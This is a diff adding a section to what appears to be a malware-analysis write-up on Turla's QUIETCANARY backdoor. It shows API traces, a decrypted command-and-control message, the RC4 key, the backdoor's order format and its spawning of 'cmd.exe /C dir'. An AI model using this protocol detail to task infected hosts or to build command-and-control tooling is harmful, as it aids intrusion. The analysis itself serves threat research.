@@ -217,4 +217,96 @@ Now that we have established a trusted relationship with QUIETCANARY we can star
 
 ![Alt text](screenshots/orders.jpg?raw=true "Available commands")
 
+Notice the 666 code associated with the "KillCommand", TURLA developpers were kind enough to refrain from using Order 66 which would have been a much violent crime...
+
+---  
+
+I've decided to test a simple 'dir' command :  
+
+```html
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <DecryptMessage>
+[PAR] PSecBufferDesc pMessage     : 0x0000000400000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x000000264197B208
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x5
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x000000264195BE90
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0xbc
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x000000264195BE95
+[STR]                   -> "HTTP/1.1 200 OK\r\nDate: Fri, 07 Mar 2025 16:41:50 GMT\r\nServer: Apache/2.4.41 (Ubuntu)\r\nContent-Length: 40\r\nConten"
+[STR]                      "t-Type: text/html; charset=UTF-8\r\n\r\n3XLuSjRx6Y17ZlS329KMj8TLT011LuYhr18VgAhO"
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x24
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x000000264195BF51
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
+```
+
+So :  
+
+```
+RC4(Base64_Decode(3XLuSjRx6Y17ZlS329KMj8TLT011LuYhr18VgAhO), "Gorgonzola")  
+```
+
+```
+"peri43s220l16c"cmd.exe" /C dir"
+```
+
+The format of any order is the following :  
+
+"rep" . "i" . id . "s" . command_code . "l" . cmd_parameter_length . "c" . cmd_parameter
+
+Which triggered the following behavior from the malare :  
+
+```html
+[CNT] [121]
+[PTP] [0x784] [0x918] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CreatePipe> in [KERNEL32.dll] 
+[PAR] PHANDLE               hReadPipe        : 0x000000265B15E9F0
+[PAR] PHANDLE               hWritePipe       : 0x000000265B15E9F8
+[PAR] LPSECURITY_ATTRIBUTES lpPipeAttributes : 0x000000265B15E9C0
+[PAR] DWORD                 nSize            : 0x0
+[RET] 0x7ffa2c05bd5f in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x918] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <CreatePipe>
+[PAR] HANDLE  hReadPipe  : 0x48c
+[PAR] HANDLE  hWritePipe : 0x668
+[RES] BOOL 0x1
+
+[CNT] [125]
+[PTP] [0x784] [0x918] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CreateProcessW> in [KERNEL32.dll] 
+[PAR] LPCWSTR               lpApplicationName   : 0x0 (null)
+[PAR] LPCWSTR               lpCommandLine       : 0x000000265B15E9F0
+[STR]                       -> ""cmd.exe"  /C dir"
+[PAR] LPSECURITY_ATTRIBUTES lpProcessAttributes : 0x0
+[PAR] LPSECURITY_ATTRIBUTES lpThreadAttributes  : 0x0
+[PAR] BOOL                  bInheritHandles     : 0x1
+[PAR] DWORD                 dwCreationFlags     : 0x8000000 (CREATE_NO_WINDOW)
+[PAR] LPVOID                lpEnvironment        : 0x0
+[PAR] LPCWSTR               lpCurrentDirectory   : 0x000000264193FB84
+[STR]                       -> "C:\Users\user\Desktop\quiet_canary"
+[PAR] LPSTARTUPINFOW        lpStartupInfo        : 0x000000265B15E980
+[FLD]                       -> lpDesktop   = 0x0 (null)
+[FLD]                       -> lpTitle     = 0x0 (null)
+[FLD]                       -> dwFlags     = 0x100 (STARTF_USESTDHANDLES)
+[FLD]                       -> wShowWindow = 0x0
+[FLD]                       -> hStdInput   = 0x0
+[FLD]                       -> hStdOutput  = 0x668
+[FLD]                       -> hStdError   = 0x670
+[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x000000264193F388
+[RET] 0x7ffa2bbfec01 in [System.ni.dll]
+```
 
